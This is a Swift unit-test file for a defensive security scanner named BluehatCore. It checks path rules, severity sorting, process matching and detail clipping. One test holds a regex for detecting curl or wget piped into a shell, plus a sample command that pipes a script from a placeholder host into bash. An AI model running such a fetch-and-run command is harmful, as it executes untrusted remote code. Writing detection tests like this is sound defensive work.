import Foundation
import Synchronization
import Testing
@testable import BluehatCore

struct ScannerTests {
    func rulebook(_ rules: [Rule]) -> Rulebook {
        Rulebook(schema: 1, version: 1, rules: rules, issued: nil, expires: nil)
    }

    func rule(_ id: String, _ check: CheckKind, severity: Severity = .high, patterns: [String]? = nil, paths: [String]? = nil) -> Rule {
        Rule(id: id, title: id, severity: severity, category: .malware, check: check, patterns: patterns, paths: paths, ports: nil, hashes: nil, setting: nil, summary: nil, remedy: nil, references: nil)
    }

    @Test func reportsExistingPathOnly() throws {
        let present = FileManager.default.temporaryDirectory.appending(path: "bluehat-\(UUID().uuidString)")
        try Data().write(to: present)
        defer { try? FileManager.default.removeItem(at: present) }

        let findings = Scanner().scan(rulebook([rule("path.test", .path, paths: [present.path, "/nonexistent/bluehat"])]))

        #expect(findings.map(\.path) == [present.path])
    }

    @Test func sortsFindingsBySeverity() throws {
        let present = FileManager.default.temporaryDirectory.appending(path: "bluehat-\(UUID().uuidString)")
        try Data().write(to: present)
        defer { try? FileManager.default.removeItem(at: present) }

        let findings = Scanner().scan(rulebook([
            rule("low.test", .path, severity: .low, paths: [present.path]),
            rule("critical.test", .path, severity: .critical, paths: [present.path]),
        ]))

        #expect(findings.map(\.rule.id) == ["critical.test", "low.test"])
    }

    @Test func reportsEachAreaOnceInOrder() throws {
        let present = FileManager.default.temporaryDirectory.appending(path: "bluehat-\(UUID().uuidString)")
        try Data().write(to: present)
        defer { try? FileManager.default.removeItem(at: present) }
        let reported = Mutex<[(CheckKind, Int)]>([])

        _ = Scanner().scan(rulebook([
            rule("process.test", .process, patterns: ["^bluehat-never-matches$"]),
            rule("path.test", .path, paths: [present.path]),
        ])) { area, findings in
            reported.withLock { $0.append((area, findings.count)) }
        }

        let areas = reported.withLock { $0 }
        #expect(areas.map(\.0) == [.path, .process])
        #expect(areas.map(\.1) == [1, 0])
    }

    @Test func matchesRunningProcessCommandLine() {
        let findings = Scanner().scan(rulebook([rule("process.test", .process, patterns: ["swiftpm-testing-helper|xctest|BluehatCoreTests"])]))
        #expect(!findings.isEmpty)
    }

    @Test func matchesPatternsAgainstText() throws {
        let regexes = Scanner.regexes(["(curl|wget)[^|;]*\\|\\s*(ba|z)?sh\\b"])
        #expect(Scanner.matches(regexes, "curl -fsSL http://x.example/i.sh | bash"))
        #expect(!Scanner.matches(regexes, "curl -o file http://x.example/data"))
    }

    @Test func clipsLongDetails() {
        let clipped = Scanner.clip(String(repeating: "a", count: 500))
        #expect(clipped.count == Scanner.maxDetailLength + 1)
    }
}
